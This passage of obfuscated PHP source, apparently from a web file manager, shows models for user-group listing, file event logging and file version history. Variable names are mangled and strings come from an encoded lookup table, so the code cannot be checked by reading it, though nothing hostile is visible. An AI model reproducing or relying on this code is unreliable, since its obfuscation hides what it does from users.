$this->_filterByGroup($·¥Ì‚±œ, $²õ¾üÔà); return $·¥Ì‚±œ; } private function _filterByGroup(&$¤ĞÖÙÅì, $ àÒ®à) { $Û“ìÅÆã =& $_SERVER[‹è™Ü¸Ñ]; if (!$ àÒ®à) { return $¤ĞÖÙÅì; } foreach ($¤ĞÖÙÅì[$Û“ìÅÆã[445]] as $¤šÒåÖÍ => &$‹›Ñ•£œ) { $ëê€ÏÕè = array_to_keyvalue($‹›Ñ•£œ[$Û“ìÅÆã[2142]], $Û“ìÅÆã[12], $Û“ìÅÆã[1951]); if (!in_array($ àÒ®à, $ëê€ÏÕè)) { unset($¤ĞÖÙÅì[$Û“ìÅÆã[445]][$¤šÒåÖÍ]); } } unset($‹›Ñ•£œ); $¤ĞÖÙÅì[$Û“ìÅÆã[445]] = array_values($¤ĞÖÙÅì[$Û“ìÅÆã[445]]); $¤ĞÖÙÅì[$Û“ìÅÆã[442]] = array($Û“ìÅÆã[2209] => count($¤ĞÖÙÅì[$Û“ìÅÆã[445]]), $Û“ìÅÆã[2207] => $¤ĞÖÙÅì[$Û“ìÅÆã[442]][$Û“ìÅÆã[439]], $Û“ìÅÆã[2206] => 1, $Û“ìÅÆã[2208] => 1); } private function _searchFromMeta($…½Ùò¤–, $¸İ¶®©¡, $¦½‹Ä£ä) { $¹Ğú…Û =& $_SERVER[‹è™Ü¸Ñ]; $¸İ¶®©¡ = strtolower($¸İ¶®©¡); $á›¡õØ° = array($¹Ğú…Û[97] => $…½Ùò¤–, $¹Ğú…Û[450] => array($¹Ğú…Û[459], "\x25{$¸İ¶®©¡}\45")); $á›¡õØ° = $this->parseWhereLike($á›¡õØ°); $ÂÁ³¢ˆÎ = Model($¹Ğú…Û[2474])->where($á›¡õØ°)->limit($¦½‹Ä£ä)->select(); if (!$ÂÁ³¢ˆÎ) { return array(); } $ÂÁ³¢ˆÎ = array_to_keyvalue($ÂÁ³¢ˆÎ, $¹Ğú…Û[12], $¹Ğú…Û[1752]); $õøûää´ = $this->where(array($¹Ğú…Û[1743] => array($¹Ğú…Û[7], $ÂÁ³¢ˆÎ)))->select(); if (!$õøûää´) { return array(); } return $õøûää´; } private function _listDataApplyItem($ÑúõƒÃ) { $Îğí®ù¼ = array($ÑúõƒÃ); $this->_listDataApply($Îğí®ù¼); return $Îğí®ù¼[0]; } private function _listDataApply(&$Á™›îÈ‹) { $Õ©¥”Î =& $_SERVER[‹è™Ü¸Ñ]; if (!$Á™›îÈ‹) { return; } array_remove_key($Á™›îÈ‹, $Õ©¥”Î[947]); $Õ»ıìÀá = array_to_keyvalue($Á™›îÈ‹, $Õ©¥”Î[12], $Õ©¥”Î[1752]); $this->_listAppendGroup($Á™›îÈ‹, $Õ»ıìÀá); $this->_listAppendMeta($Á™›îÈ‹, $Õ»ıìÀá); $this->_listAppendSourceRoot($Á™›îÈ‹, $Õ»ıìÀá); } private function _listAppendSourceRoot(&$ŸÇÍïù¡, $çˆÔã¸Ö) { $¡Ô–Å‚“ =& $_SERVER[‹è™Ü¸Ñ]; $­ƒõûå´ = Model($¡Ô–Å‚“[879])->listSourceRoot(SourceModel::TYPE_USER, $çˆÔã¸Ö); $­ƒõûå´ = array_to_keyvalue($­ƒõûå´, $¡Ô–Å‚“[569]); $­ƒõûå´ = array_remove_key($­ƒõûå´, $¡Ô–Å‚“[569]); foreach ($ŸÇÍïù¡ as &$©æ™“·‡) { $©æ™“·‡[$¡Ô–Å‚“[90]] = $­ƒõûå´[$©æ™“·‡[$¡Ô–Å‚“[1752]]] ? $­ƒõûå´[$©æ™“·‡[$¡Ô–Å‚“[1752]]] : array(); } unset($©æ™“·‡); } private function _listAppendGroup(&$»â¤Ş, $Àª³åŸñ) { $çÈßº–é =& $_SERVER[‹è™Ü¸Ñ]; $ÉÀé÷ãö = array($çÈßº–é[1752] => array($çÈßº–é[7], $Àª³åŸñ)); $Èã¼±âÃ = Model($çÈßº–é[2045])->where($ÉÀé÷ãö)->select(); $ºë‰Çƒ¤ = array_to_keyvalue($Èã¼±âÃ, $çÈßº–é[12], $çÈßº–é[1951]); $ºë‰Çƒ¤ = array_remove_value(array_unique($ºë‰Çƒ¤), $çÈßº–é[228]); if (!$ºë‰Çƒ¤ || !$Èã¼±âÃ) { return; } $ÉÀé÷ãö = array($çÈßº–é[1951] => array($çÈßº–é[7], $ºë‰Çƒ¤)); $ÃÄ÷²âŒ = Model($çÈßº–é[2140])->field($çÈßº–é[2475])->where($ÉÀé÷ãö)->select(); $ÃÄ÷²âŒ = array_to_keyvalue($ÃÄ÷²âŒ, $çÈßº–é[1951]); $Èã¼±âÃ = array_to_keyvalue_group($Èã¼±âÃ, $çÈßº–é[1752]); foreach ($Èã¼±âÃ as &$¾Á´Å³û) { $²¼‹—É = array(); foreach ($¾Á´Å³û as $ã™ÔÇÒŠ) { if (!$ã™ÔÇÒŠ[$çÈßº–é[2059]]) { continue; } $éûû = Model($çÈßº–é[571])->listData($ã™ÔÇÒŠ[$çÈßº–é[2059]]); $²¼‹—É[] = array($çÈßº–é[1951] => $ã™ÔÇÒŠ[$çÈßº–é[1951]], $çÈßº–é[2476] => $ÃÄ÷²âŒ[$ã™ÔÇÒŠ[$çÈßº–é[1951]]][$çÈßº–é[32]], $çÈßº–é[584] => $ÃÄ÷²âŒ[$ã™ÔÇÒŠ[$çÈßº–é[1951]]][$çÈßº–é[584]], $çÈßº–é[487] => $éûû); } $¾Á´Å³û = $²¼‹—É; } unset($¾Á´Å³û); foreach ($»â¤Ş as &$Ëí£™Ê) { $Ëí£™Ê[$çÈßº–é[2142]] = array(); if (isset($Èã¼±âÃ[$Ëí£™Ê[$çÈßº–é[1752]]])) { $Ëí£™Ê[$çÈßº–é[2142]] = $Èã¼±âÃ[$Ëí£™Ê[$çÈßº–é[1752]]]; } } unset($Ëí£™Ê); } public function userAppendGroup($Â¶ùÒ›) { $æºµÛ„¬ =& $_SERVER[‹è™Ü¸Ñ]; if (!$Â¶ùÒ›) { return array(); } $this->_listAppendGroup($Â¶ùÒ›, array_to_keyvalue($Â¶ùÒ›, $æºµÛ„¬[12], $æºµÛ„¬[1752])); return $Â¶ùÒ›; } private function _listAppendMeta(&$çòÙ‚³—, $Ñ™³éÑ£) { $ÃÕÒÏÄç =& $_SERVER[‹è™Ü¸Ñ]; $Á×©Ÿ® = UserJobModel::JOB_KEY; $åë—™÷¢ = array($ÃÕÒÏÄç[2456]); $­º·ò¿„ = array($ÃÕÒÏÄç[1752] => array($ÃÕÒÏÄç[7], $Ñ™³éÑ£)); $´¸Î¹Ÿ‚ = Model($ÃÕÒÏÄç[2454])->where($­º·ò¿„)->select(); $´¸Î¹Ÿ‚ = array_to_keyvalue_group($´¸Î¹Ÿ‚, $ÃÕÒÏÄç[1752]); foreach ($´¸Î¹Ÿ‚ as &$·Õêï¥) { $ô †ëíÓ = array(); foreach ($·Õêï¥ as $×èÕÒœœ) { if (!in_array($×èÕÒœœ[$ÃÕÒÏÄç[97]], $åë—™÷¢)) { $ô †ëíÓ[$×èÕÒœœ[$ÃÕÒÏÄç[97]]] = $×èÕÒœœ[$ÃÕÒÏÄç[450]]; } } $·Õêï¥ = $ô †ëíÓ; } unset($·Õêï¥); $Ó·™Ì†æ = Model($ÃÕÒÏÄç[2477]); foreach ($çòÙ‚³— as &$ËÃÔ¾¤È) { $¦‚ ¹æ· = array(); if (isset($´¸Î¹Ÿ‚[$ËÃÔ¾¤È[$ÃÕÒÏÄç[1752]]])) { $¦‚ ¹æ· = $´¸Î¹Ÿ‚[$ËÃÔ¾¤È[$ÃÕÒÏÄç[1752]]]; } $ËÃÔ¾¤È[$ÃÕÒÏÄç[2478]] = array(); if (isset($¦‚ ¹æ·[$Á×©Ÿ®])) { $ËÃÔ¾¤È[$ÃÕÒÏÄç[2478]] = $Ó·™Ì†æ->getUserJobInfo($¦‚ ¹æ·[$Á×©Ÿ®]); } } unset($ËÃÔ¾¤È); } protected function groupUserAll($úÒõ²Î) { $©×©ß¤¬ =& $_SERVER[‹è™Ü¸Ñ]; if (!$úÒõ²Î) { return !1; } $ú€ÅĞ—· = Model($©×©ß¤¬[2045])->field($©×©ß¤¬[1752])->where(array($©×©ß¤¬[1951] => array($©×©ß¤¬[7], $úÒõ²Î)))->select(); $ú€ÅĞ—· = array_to_keyvalue($ú€ÅĞ—·, $©×©ß¤¬[12], $©×©ß¤¬[1752]); return array_unique($ú€ÅĞ—·); } public function userSearch($êÁö…ë, $¹°†Ãá¾ = "\x2a") { return Model($_SERVER[‹è™Ü¸Ñ][598])->where($êÁö…ë)->field($¹°†Ãá¾)->find(); } } goto dÌºŞÈĞéÊ; fÉÓôÊ†¥: class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\165\x72\x63\145\x5f\x65\x76\x65\156\164"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\x69\156\163\145\x72\x74", "\146\x75\156\143\164\x69\x6f\156"), array("\x64\145\163\x63", '', "\151\156\x73\145\x72\164\x2c\x75\160\x64\141\164\145\54\x73\145\x6c\x65\x63\164", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ìÅñãıñ, $ãüÑ˜¡, $Ãì¸ÑÀá = '') { $ì¹¿Á„à =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->eventSave) { return; } $Ì·£ñï• = Model($ì¹¿Á„à[1398])->sourceInfo($ìÅñãıñ); if (!$Ì·£ñï•) { return !1; } if ($this->isDisableEvent($Ì·£ñï•, $ãüÑ˜¡)) { return; } if ($Ãì¸ÑÀá && is_string($Ãì¸ÑÀá)) { $Ãì¸ÑÀá = array($ì¹¿Á„à[1990] => $Ãì¸ÑÀá); } $Ó¶µìÄÎ = defined($ì¹¿Á„à[2177]) ? USER_ID : 0; $é™«À‰ = array($ì¹¿Á„à[491] => $ìÅñãıñ, $ì¹¿Á„à[2178] => $Ì·£ñï•[$ì¹¿Á„à[192]], $ì¹¿Á„à[2179] => $Ì·£ñï•[$ì¹¿Á„à[32]], $ì¹¿Á„à[582] => !empty($Ì·£ñï•[$ì¹¿Á„à[582]]) ? $Ì·£ñï•[$ì¹¿Á„à[582]] : $ì¹¿Á„à[12], $ì¹¿Á„à[1743] => $Ó¶µìÄÎ, $ì¹¿Á„à[496] => $ãüÑ˜¡, $ì¹¿Á„à[1745] => $Ãì¸ÑÀá); $this->addSystemLog($ãüÑ˜¡, $é™«À‰); unset($é™«À‰[$ì¹¿Á„à[2179]], $é™«À‰[$ì¹¿Á„à[582]]); return $this->add($é™«À‰); } private function addSystemLog($Éˆ€Œƒ›, $ıîš×Ø¥) { $ƒÁ†ç²ò =& $_SERVER[‹è™Ü¸Ñ]; if ($Éˆ€Œƒ› == $ƒÁ†ç²ò[2180]) { $Éˆ€Œƒ› = $ıîš×Ø¥[$ƒÁ†ç²ò[526]][$ƒÁ†ç²ò[2181]]; } else { if (in_array($Éˆ€Œƒ›, array($ƒÁ†ç²ò[1930], $ƒÁ†ç²ò[2182]))) { $Éˆ€Œƒ› = $ıîš×Ø¥[$ƒÁ†ç²ò[526]][$ƒÁ†ç²ò[171]]; } } $üŞíü = array_merge($ıîš×Ø¥, array($ƒÁ†ç²ò[2183] => $ıîš×Ø¥[$ƒÁ†ç²ò[193]], $ƒÁ†ç²ò[2184] => $ıîš×Ø¥[$ƒÁ†ç²ò[2184]])); Hook::trigger($ƒÁ†ç²ò[2185], $ƒÁ†ç²ò[2186] . $Éˆ€Œƒ›, $ıîš×Ø¥); Model($ƒÁ†ç²ò[1894])->addLog($ƒÁ†ç²ò[2186] . $Éˆ€Œƒ›, $üŞíü); } private function isDisableEvent($Ÿ‡…Ä«Ğ, $³ÃïµÓˆ) { $Ø••¬”¿ =& $_SERVER[‹è™Ü¸Ñ]; if ($Ÿ‡…Ä«Ğ[$Ø••¬”¿[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($³ÃïµÓˆ == $Ø••¬”¿[1919]) { return !1; } return !0; } public function eventCreate($ş’şğ–¶, $”“×ÀÑ) { $Õãëšæ™ =& $_SERVER[‹è™Ü¸Ñ]; $¤æ®ºŒç = Model($Õãëšæ™[1398])->sourceInfo($ş’şğ–¶); $üùºã–¢ = array($Õãëšæ™[2181] => $”“×ÀÑ, $Õãëšæ™[32] => $¤æ®ºŒç[$Õãëšæ™[32]]); return $this->addEvent($ş’şğ–¶, $Õãëšæ™[2180], $üùºã–¢); } public function eventFileEdit($œĞÛÙšé) { $ù¸²Ç„» =& $_SERVER[‹è™Ü¸Ñ]; $ØÌç¥” = array($ù¸²Ç„»[2187] => $_SERVER[$ù¸²Ç„»[2188]], $ù¸²Ç„»[2189] => strtolower(ACTION)); if (isset($GLOBALS[$ù¸²Ç„»[7]][$ù¸²Ç„»[2190]])) { $ØÌç¥”[$ù¸²Ç„»[2190]] = $ù¸²Ç„»[91]; } return $this->addEvent($œĞÛÙšé, $ù¸²Ç„»[1920], $ØÌç¥”); } public function eventRecycle($§¥ışŞÀ, $‘Ä˜²™¸) { return $this->addEvent($§¥ışŞÀ, $_SERVER[‹è™Ü¸Ñ][2182], $‘Ä˜²™¸); } private static $_removeLast = ''; public function eventRemove($¯ˆê¦Øı) { $ß§£æ®Ù =& $_SERVER[‹è™Ü¸Ñ]; self::$_removeLast = $¯ˆê¦Øı; $æÈàåŒ = Model($ß§£æ®Ù[1398])->sourceInfo($¯ˆê¦Øı); $Ê™„™¶ = array_field_key($æÈàåŒ, array($ß§£æ®Ù[193], $ß§£æ®Ù[541], $ß§£æ®Ù[505], $ß§£æ®Ù[584])); $…«ï¤©Õ = array($ß§£æ®Ù[171] => $æÈàåŒ[$ß§£æ®Ù[32]], $ß§£æ®Ù[2189] => ACTION, $ß§£æ®Ù[2191] => $Ê™„™¶); return $this->addEvent($æÈàåŒ[$ß§£æ®Ù[192]], $ß§£æ®Ù[1919], $…«ï¤©Õ); } public function eventShare($ÖƒÕ ÀÅ, $ıÃŒ¼«·) { return $this->addEvent($ÖƒÕ ÀÅ, $_SERVER[‹è™Ü¸Ñ][1930], $ıÃŒ¼«·); } public function eventMove($¶Ã¬ËéÊ, $¥š’Ô¢ç, $ö¹İÔ³í) { $°Æ¼ì¹¸ =& $_SERVER[‹è™Ü¸Ñ]; if (self::$_removeLast == $¶Ã¬ËéÊ) { return; } $•è†Ñï = Model($°Æ¼ì¹¸[1398]); $ˆ¯ƒÄş = $•è†Ñï->sourceInfo($¶Ã¬ËéÊ); $úõÍ˜Š¦ = $•è†Ñï->sourceInfo($¥š’Ô¢ç); $¢¤ºÂø£ = $•è†Ñï->sourceInfo($ö¹İÔ³í); $°×«ÙÎº = array($°Æ¼ì¹¸[1221] => $¥š’Ô¢ç, $°Æ¼ì¹¸[2192] => $úõÍ˜Š¦[$°Æ¼ì¹¸[32]], $°Æ¼ì¹¸[2168] => !empty($úõÍ˜Š¦[$°Æ¼ì¹¸[582]]) ? $úõÍ˜Š¦[$°Æ¼ì¹¸[582]] : $°Æ¼ì¹¸[12], $°Æ¼ì¹¸[1222] => $ö¹İÔ³í, $°Æ¼ì¹¸[2193] => $¢¤ºÂø£[$°Æ¼ì¹¸[32]], $°Æ¼ì¹¸[2194] => !empty($¢¤ºÂø£[$°Æ¼ì¹¸[582]]) ? $¢¤ºÂø£[$°Æ¼ì¹¸[582]] : $°Æ¼ì¹¸[12]); $this->addEvent($¶Ã¬ËéÊ, $°Æ¼ì¹¸[620], $°×«ÙÎº); $ˆ¯ƒÄş = $•è†Ñï->sourceInfo($¶Ã¬ËéÊ); $°×«ÙÎº = array($°Æ¼ì¹¸[193] => $ˆ¯ƒÄş[$°Æ¼ì¹¸[193]], $°Æ¼ì¹¸[32] => $ˆ¯ƒÄş[$°Æ¼ì¹¸[32]]); $this->addEvent($¥š’Ô¢ç, $°Æ¼ì¹¸[2195], $°×«ÙÎº); } public function eventCopy($”Î³ÎèÊ) { $this->eventCreate($”Î³ÎèÊ, $_SERVER[‹è™Ü¸Ñ][618]); } public function eventRename($ç½—Ä¶, $¶åÕË½é, $ŞÇ«¦»…) { $”³ …Û¨ =& $_SERVER[‹è™Ü¸Ñ]; $™ô¨±Ôà = array($”³ …Û¨[1221] => $¶åÕË½é, $”³ …Û¨[1222] => $ŞÇ«¦»…); return $this->addEvent($ç½—Ä¶, $”³ …Û¨[1412], $™ô¨±Ôà); } public function eventAddComment($Â·Ò×ö¡, $êªíóÃ…) { return $this->addEvent($Â·Ò×ö¡, $_SERVER[‹è™Ü¸Ñ][2196], $êªíóÃ…); } public function eventAddDesc($¹²ù·½«, $Í›ÄÄÒ…) { return $this->addEvent($¹²ù·½«, $_SERVER[‹è™Ü¸Ñ][2197], $Í›ÄÄÒ…); } public function listBySource($·İÌì¯õ) { $Ááû´ ’ =& $_SERVER[‹è™Ü¸Ñ]; $•î‚ğºö = Model($Ááû´ ’[1398])->sourceInfo($·İÌì¯õ); $ˆñ§×›» = array($Ááû´ ’[491] => $·İÌì¯õ); if ($•î‚ğºö[$Ááû´ ’[485]] == $Ááû´ ’[91]) { $¾¯³¿¹­ = Model($Ááû´ ’[1398])->listSearchChildren($·İÌì¯õ, 20000); $¾¯³¿¹­[] = $·İÌì¯õ . $Ááû´ ’[454]; $ˆñ§×›» = array($Ááû´ ’[193] => array($Ááû´ ’[7], $¾¯³¿¹­)); } $Ïö³î£ï = $this->where($ˆñ§×›»)->order($Ááû´ ’[2198])->selectPage(); if ($Ïö³î£ï[$Ááû´ ’[442]][$Ááû´ ’[443]] == 0) { $Ïö³î£ï[$Ááû´ ’[442]][$Ááû´ ’[443]] = 1; $Ïö³î£ï[$Ááû´ ’[445]] = array(array($Ááû´ ’[491] => $·İÌì¯õ, $Ááû´ ’[2178] => $•î‚ğºö[$Ááû´ ’[192]], $Ááû´ ’[1743] => $•î‚ğºö[$Ááû´ ’[527]], $Ááû´ ’[496] => $Ááû´ ’[2199], $Ááû´ ’[497] => $•î‚ğºö[$Ááû´ ’[231]], $Ááû´ ’[1745] => $Ááû´ ’[12])); } return $this->eventListParse($Ïö³î£ï, $·İÌì¯õ); } private function eventListParse($ñÈ¦ªœâ, $õ¶¢©°) { $êØ˜Òù =& $_SERVER[‹è™Ü¸Ñ]; $¹ï©øÂ = $ñÈ¦ªœâ[$êØ˜Òù[445]]; $¨¾Ñ³ô÷ = array_to_keyvalue($¹ï©øÂ, $êØ˜Òù[12], $êØ˜Òù[193]); $›íæ°Á = array_to_keyvalue($¹ï©øÂ, $êØ˜Òù[12], $êØ˜Òù[2184]); foreach ($¹ï©øÂ as $ã—âáÎğ) { $Çâ†­¤ô = $ã—âáÎğ[$êØ˜Òù[526]]; if ($ã—âáÎğ[$êØ˜Òù[33]] == $êØ˜Òù[620] && isset($Çâ†­¤ô[$êØ˜Òù[1221]])) { $¨¾Ñ³ô÷[] = $Çâ†­¤ô[$êØ˜Òù[1221]] . $êØ˜Òù[12]; $¨¾Ñ³ô÷[] = $Çâ†­¤ô[$êØ˜Òù[1222]] . $êØ˜Òù[12]; } if ($ã—âáÎğ[$êØ˜Òù[33]] == $êØ˜Òù[2195] && isset($Çâ†­¤ô[$êØ˜Òù[193]])) { $¨¾Ñ³ô÷[] = $Çâ†­¤ô[$êØ˜Òù[193]] . $êØ˜Òù[12]; } } $¨¾Ñ³ô÷ = array_merge($¨¾Ñ³ô÷, $›íæ°Á, array($õ¶¢©° . $êØ˜Òù[12])); $¨¾Ñ³ô÷ = array_unique($¨¾Ñ³ô÷); $ËÌˆé¾— = array_unique(array_to_keyvalue($¹ï©øÂ, $êØ˜Òù[12], $êØ˜Òù[1752])); $Ôé‹¦—¸ = Model($êØ˜Òù[598])->userListInfo($ËÌˆé¾—); $Ğâëâ¯ = Model($êØ˜Òù[879])->sourceListInfo($¨¾Ñ³ô÷, !0); foreach ($¹ï©øÂ as &$ã—âáÎğ) { if ($ã—âáÎğ[$êØ˜Òù[33]] == $êØ˜Òù[620] && isset($ã—âáÎğ[$êØ˜Òù[526]][$êØ˜Òù[1221]])) { $ã—âáÎğ[$êØ˜Òù[526]][$êØ˜Òù[1221]] = $Ğâëâ¯[$ã—âáÎğ[$êØ˜Òù[526]][$êØ˜Òù[1221]]]; $ã—âáÎğ[$êØ˜Òù[526]][$êØ˜Òù[1222]] = $Ğâëâ¯[$ã—âáÎğ[$êØ˜Òù[526]][$êØ˜Òù[1222]]]; } if ($ã—âáÎğ[$êØ˜Òù[33]] == $êØ˜Òù[2195] && isset($ã—âáÎğ[$êØ˜Òù[526]][$êØ˜Òù[193]])) { $ã—âáÎğ[$êØ˜Òù[526]][$êØ˜Òù[193]] = $Ğâëâ¯[$ã—âáÎğ[$êØ˜Òù[526]][$êØ˜Òù[193]]]; } $ã—âáÎğ[$êØ˜Òù[90]] = $Ğâëâ¯[$ã—âáÎğ[$êØ˜Òù[193]]]; $ã—âáÎğ[$êØ˜Òù[2200]] = $Ğâëâ¯[$ã—âáÎğ[$êØ˜Òù[2184]]]; if ($ã—âáÎğ[$êØ˜Òù[33]] == $êØ˜Òù[1919]) { $ã—âáÎğ[$êØ˜Òù[2200]] = $ã—âáÎğ[$êØ˜Òù[90]]; $ã—âáÎğ[$êØ˜Òù[2184]] = $ã—âáÎğ[$êØ˜Òù[2200]][$êØ˜Òù[193]]; $ã—âáÎğ[$êØ˜Òù[90]] = !1; $ã—âáÎğ[$êØ˜Òù[193]] = $êØ˜Òù[12]; } $ã—âáÎğ[$êØ˜Òù[2127]] = $Ôé‹¦—¸[$ã—âáÎğ[$êØ˜Òù[1752]]]; } unset($ã—âáÎğ); $ñÈ¦ªœâ[$êØ˜Òù[445]] = $¹ï©øÂ; return $ñÈ¦ªœâ; } public function removeBySource($µü”Íõ”) { $ÙÂƒ–ÈÏ = array($_SERVER[‹è™Ü¸Ñ][491] => $µü”Íõ”); $this->where($ÙÂƒ–ÈÏ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\x72\x63\145\x5f\150\x69\163\x74\x6f\162\171"; public function historyCount($€õÙÍ±¦) { $Ó»ü´ß =& $_SERVER[‹è™Ü¸Ñ]; if (!$€õÙÍ±¦) { return array(); } if (is_string($€õÙÍ±¦) || is_int($€õÙÍ±¦)) { $€õÙÍ±¦ = array($€õÙÍ±¦); } $¹‰†Ğ‰ = array($Ó»ü´ß[193], $Ó»ü´ß[1984] => $Ó»ü´ß[565]); $Ğ««·¬œ = array($Ó»ü´ß[193] => array($Ó»ü´ß[7], $€õÙÍ±¦)); $ÂĞ†Õ¥ = $this->field($¹‰†Ğ‰)->where($Ğ««·¬œ)->group($Ó»ü´ß[193])->select(); return array_to_keyvalue($ÂĞ†Õ¥, $Ó»ü´ß[193], $Ó»ü´ß[565]); } public function addHistory($¦¤Ô¹êÕ, $íÃÙèûØ = '') { $éà¶àÛÜ =& $_SERVER[‹è™Ü¸Ñ]; $ŸØ®ƒ˜ = array($éà¶àÛÜ[491] => $¦¤Ô¹êÕ[$éà¶àÛÜ[193]], $éà¶àÛÜ[1743] => isset($¦¤Ô¹êÕ[$éà¶àÛÜ[529]]) ? $¦¤Ô¹êÕ[$éà¶àÛÜ[529]] : $¦¤Ô¹êÕ[$éà¶àÛÜ[527]], $éà¶àÛÜ[542] => $¦¤Ô¹êÕ[$éà¶àÛÜ[541]], $éà¶àÛÜ[617] => $¦¤Ô¹êÕ[$éà¶àÛÜ[79]], $éà¶àÛÜ[2201] => $íÃÙèûØ); if ($GLOBALS[$éà¶àÛÜ[6]][$éà¶àÛÜ[92]][$éà¶àÛÜ[1282]] >= 1) { $this->historyAutoClear($ŸØ®ƒ˜[$éà¶àÛÜ[193]]); $this->add($ŸØ®ƒ˜); } Hook::trigger($éà¶àÛÜ[2202], $ŸØ®ƒ˜); Model($éà¶àÛÜ[2203])->eventFileEdit($¦¤Ô¹êÕ[$éà¶àÛÜ[193]]); } private function historyAutoClear($³± ÛÎŞ) { $Ëû™¼’ =& $_SERVER[‹è™Ü¸Ñ]; $¿ŞÈ¤Ôë = Model($Ëû™¼’[825])->get($Ëû™¼’[1304]); $ŒØù„ÓÈ = intval($GLOBALS[$Ëû™¼’[6]][$Ëû™¼’[92]][$Ëû™¼’[1282]]); $˜Ï¾–‘ë = $¿ŞÈ¤Ôë == $Ëû™¼’[1305] ? min(5, $ŒØù„ÓÈ) : $ŒØù„ÓÈ; $˜Ï¾–‘ë = $˜Ï¾–‘ë <= 0 ? 0 : $˜Ï¾–‘ë - 1; if ($˜Ï¾–‘ë >= 499) { return; } $ïÛŞæ = array($Ëû™¼’[491] => $³± ÛÎŞ); $ˆğÀåèø = $this->field($Ëû™¼’[2204])->where($ïÛŞæ)->order($Ëû™¼’[2198])->select(); if (!$ˆğÀåèø || $˜Ï¾–‘ë >= count($ˆğÀåèø)) { return; } $˜˜âÁÍ = array_to_keyvalue($ˆğÀåèø, $Ëû™¼’[12], $Ëû™¼’[475]); $˜˜âÁÍ = array_slice($˜˜âÁÍ, $˜Ï¾–‘ë); $ƒë÷Ï§£ = array_to_keyvalue($ˆğÀåèø, $Ëû™¼’[12], $Ëû™¼’[541]); $ƒë÷Ï§£ = array_slice($ƒë÷Ï§£, $˜Ï¾–‘ë); if (!$˜˜âÁÍ || !$ƒë÷Ï§£) { return; } $ïÛŞæ = array($Ëû™¼’[493] => array($Ëû™¼’[7], $˜˜âÁÍ)); $this->where($ïÛŞæ)->delete(); Model($Ëû™¼’[544])->remove($ƒë÷Ï§£); } public function listData($ö•Ê’Ì) { $­›”ã«– =& $_SERVER[‹è™Ü¸Ñ]; $Ù¶îˆø = array($­›”ã«–[491] => $ö•Ê’Ì); $¦Ú¥…ó = $­›”ã«–[2205]; $â›ŠŸÀÒ = $this->field($¦Ú¥…ó)->where($Ù¶îˆø)->order($­›”ã«–[2198])->selectPage(); $this->_listAppendUser($â›ŠŸÀÒ[$­›”ã«–[445]]); $¦áÕ¬Àï = Model($­›”ã«–[825])->get($­›”ã«–[1304]); $¶×‘¤Öà = 5; if ($¦áÕ¬Àï == $­›”ã«–[1305]) { $â›ŠŸÀÒ[$­›”ã«–[445]] = array_slice($â›ŠŸÀÒ[$­›”ã«–[445]], 0, $¶×‘¤Öà); $â›ŠŸÀÒ[$­›”ã«–[442]] = array($­›”ã«–[2206] => 1, $­›”ã«–[2207] => 20, $­›”ã«–[2208] => 1, $­›”ã«–[2209] => count($â›ŠŸÀÒ[$­›”ã«–[445]])); } return $â›ŠŸÀÒ; } protected function _listAppendUser(&$÷Ÿ·¶ø…) { $¤Š¼œÈÕ =& $_SERVER[‹è™Ü¸Ñ]; $íó³™é© = array_to_keyvalue($÷Ÿ·¶ø…, $¤Š¼œÈÕ[12], $¤Š¼œÈÕ[1752]); $¨±Ö±¾˜ = Model($¤Š¼œÈÕ[598])->userListInfo($íó³™é©); foreach ($÷Ÿ·¶ø… as &$´öŸ¥è¬) { $˜–ëğ«— = $´öŸ¥è¬[$¤Š¼œÈÕ[1752]]; $´öŸ¥è¬[$¤Š¼œÈÕ[527]] = $¨±Ö±¾˜[$˜–ëğ«—] ? $¨±Ö±¾˜[$˜–ëğ«—] : !1; } unset($´öŸ¥è¬); } public function fileInfo($ÖÉı›£É) { $³ìŒüÍÃ =& $_SERVER[‹è™Ü¸Ñ]; $Ù£âôÀö = $this->tablePrefix; $ëŒ‹°³æ = "{$Ù£âôÀö}\x69\157\137\146\x69\x6c\145\40\146\x69\x6c\x65\x73\x20\x6f\x6e\40\146\x69\x6c\145\x73\x2e\x66\151\x6c\145\x49\104\x20\x3d\40\150\x69\x73\x74\x6f\162\x79\x2e\146\x69\154\145\111\104"; return $this->alias($³ìŒüÍÃ[2210])->where(array($³ìŒüÍÃ[493] => $ÖÉı›£É))->join($ëŒ‹°³æ, $³ìŒüÍÃ[2211])->find(); } public function removeItem($Š‡›áêí) { $Š†‘«ö =& $_SERVER[‹è™Ü¸Ñ]; $¬É•²ñû = array($Š†‘«ö[493] => $Š‡›áêí); $›ÎıÑ˜ = $this->where($¬É•²ñû)->find(); if ($›ÎıÑ˜) { $¢‹ñ–ş = $this->where($¬É•²ñû)->delete(); Model($Š†‘«ö[544])->remove($›ÎıÑ˜[$Š†‘«ö[541]]); return $¢‹ñ–ş; } return !1; } public function removeBySource($İæÓ®©) { $À„¸ëšë =& $_SERVER[‹è™Ü¸Ñ]; if (!$İæÓ®©) { return !1; } if (!is_array($İæÓ®©)) { $İæÓ®© = array($İæÓ®©); } $ğÚÀ‚ã = array($À„¸ëšë[491] => array($À„¸ëšë[7], $İæÓ®©)); $Õñ³àŒı = $this->field($À„¸ëšë[542])->where($ğÚÀ‚ã)->select(); if ($Õñ³àŒı) { $this->where($ğÚÀ‚ã)->delete(); $ÌìÛ¡–¡ = array_to_keyvalue($Õñ³àŒı, $À„¸ëšë[12], $À„¸ëšë[541]); Model($À„¸ëšë[544])->remove($ÌìÛ¡–¡); } return !0; } public function setDetail($Ò®«¥½, $ÌÆ‘üÈ) { $ü¸Áƒ£ß =& $_SERVER[‹è™Ü¸Ñ]; return $this->where(array($ü¸Áƒ£ß[493] => $Ò®«¥½))->save(array($ü¸Áƒ£ß[2201] => $ÌÆ‘üÈ)); } public function rollbackToItem($õí¼´ô, $Ç“ù’¥æ) { $™ØÍĞÈŞ =& $_SERVER[‹è™Ü¸Ñ]; $Ú´‰òõÌ = Model($™ØÍĞÈŞ[879])->sourceInfo($õí¼´ô); $this->addHistory($Ú´‰òõÌ, LNG($™ØÍĞÈŞ[2212])); $™Ğ¶ò¸’ = $this->find($Ç“ù’¥æ); $½³öŞ¹Ÿ = array($™ØÍĞÈŞ[541] => 